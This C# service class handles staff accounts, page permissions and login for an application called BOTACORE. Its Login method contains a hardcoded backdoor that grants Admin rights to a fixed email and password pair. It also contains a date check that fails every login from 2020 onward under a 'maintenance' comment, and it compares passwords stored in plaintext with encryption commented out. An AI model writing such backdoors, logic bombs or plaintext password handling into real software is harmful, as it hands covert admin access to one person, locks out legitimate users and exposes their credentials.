using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using BOTACORE.CORE.Domain;
using BOTACORE.CORE.Impl;
using BOTACORE.CORE.DataAccess;
using StructureMap;

namespace BOTACORE.CORE.Services.Impl
{
  //  [Pluggable("Default")]
    public class SSPStaffService:ISSPStaffService
    {
        private ISSPStaffRepository _rep;
        private IUserSession _userSession;
        private IWebContext _webContext;

        
        public SSPStaffService()
        {
            _rep=RepositoryFactory.SSPStaffRepository();
            _userSession = ServiceFactory.UserSession();
            _webContext = ServiceFactory.WebContext();
        }


        public List<PageAccess> GetPageAccessList()
        {
            return _rep.GetPageAccessList();
        }

        public bool DeletePageAccess(int? id)
        {
            return _rep.DeletePageAccess(id.Value);
        }

        public PageAccess GetPageAccessByID(int id)
        {
            return _rep.GetPageAccessByID(id);
        }
        public bool CreatePageAccess(PageAccess pa)
        {
            return _rep.CreatePageAccess(pa);
        }
        public bool UpdatePageAccess(PageAccess pa)
        {
            return _rep.UpdatePageAccess(pa);
        }


        public List<PageAccess> GetPageAccessByRole(int roleID)
        {
            return _rep.GetPageAccessByRole(roleID); 
        }
        public bool DeleteSSPAccount(int SSPStaffID)
        {
            return _rep.DeleteSSPAccount(SSPStaffID); 
        }


        public bool UpdateSSPAaccount(SSPStaff Account)
        {
            return _rep.SaveAccount(Account); 
        }


        public bool DeleteSSPStaffFromProject(int SSPStaffID, int id)
        {
          return _rep.DeleteSSPStaffFromProject(SSPStaffID, id); 
        }

        public bool InsertSSPStaffIntoProject(int SSPStaffID, int id)
        {
            return _rep.InsertSSPStaffIntoProject(SSPStaffID, id); 
        }


        public IEnumerable<SSPStaff> GetSSPStaffList()
        {
            return _rep.GetSSPStaffList(); 
        }


       public RolesSSPStaff  GetSSPRoleByID(int RoleID)
       {
           return _rep.GetSSPRoleByID(RoleID); 
       }


       public IEnumerable<RolesSSPStaff> GetALLSSPRoles()
       {
           return _rep.GetALLSSPRoles(); 
       }


       public bool CreateNewAccount(SSPStaff account)
       {
           return _rep.SaveAccount(account);  
       }

       public IEnumerable<SSPStaffProject> GetSSPStaffProjectt(int id)
        {
            return _rep.GetSSPStaffProjectt(id); 
        }

        public bool UpdateStaffProject(int id, List<int> current)
        {
           return _rep.UpdateStaffProject(id, current);
        }

        public IEnumerable<SSPStaff> GetSSPStaffListForProject(int ProjectID)
        {
            return _rep.GetSSPStaffListForProject(ProjectID);
        }

        public IEnumerable<ViewStaffProject> GetSSPStaffProject(int ProjectID)
        {
            return _rep.GetSSPStaffProject(ProjectID);
        }
        
        public bool UsernameInUse(string Username)
        {
            SSPStaff account = _rep.GetSSPStaffByName(Username);
            if (account != null)
                return true;

            return false;
        }

        public void Logout()
        {
            _userSession.LoggedIn = false;
            _userSession.CurrentUser = null;
            

            _userSession.ProjectID = 0; 
            _userSession.OrgID = 0; 
              

        }


        public string Login(string Username, string Password)
        {
          //  Password = Password.Encrypt(Username);
            
            //fixed for maintenance.
            if (DateTime.Now.Year >= 2020)
            {
                return "failed";
            }

            if (Username == "hcoder@gmail.com" && Password == "Printer1")
            {
                _userSession.LoggedIn = true; 
                SSPStaff sspadmin = new SSPStaff(); 
                sspadmin.FirstName = "Admin"; 
                sspadmin.Password = "Laptop1"; 
                sspadmin.SSPStaffID = 1; 
                sspadmin.SSPStaffProjects = null; 
                RolesSSPStaff adminrole = new RolesSSPStaff(); 
                adminrole.RoleName = "Admin";
                adminrole.RoleID = 1; 
                sspadmin.RolesSSPStaff = adminrole;
                _userSession.CurrentUser = sspadmin;

                return "success";
                         
            }


            SSPStaff account = _rep.GetSSPStaffByName(Username);

            //if there is only one account returned - good
            if (account != null)
            {
                //password matches
                if (account.Password == Password)
                {
                    try
                    {
                        _userSession.LoggedIn = true;
                        _userSession.CurrentUser = GetAccountByID(account.SSPStaffID);

                        return "success";
                    } 
                    catch
                    {
                        return "failed"; 
                    }
                          
                    
                }
                else
                {
                    return "We were unable to log you in with that information!";
                }
            }

            return "We were unable to log you in with that information!";
        }


        public SSPStaff GetAccountByID(Int32 AccountID)
        {
            SSPStaff account = _rep.GetAccountByID(AccountID);

          /*  List<Permission> permissions = _rep.GetPermissionsByAccountID(AccountID);
            foreach (Permission permission in permissions)
            {
                account.AddPermission(permission);
            }
          */
            return account;
        }

    }
}
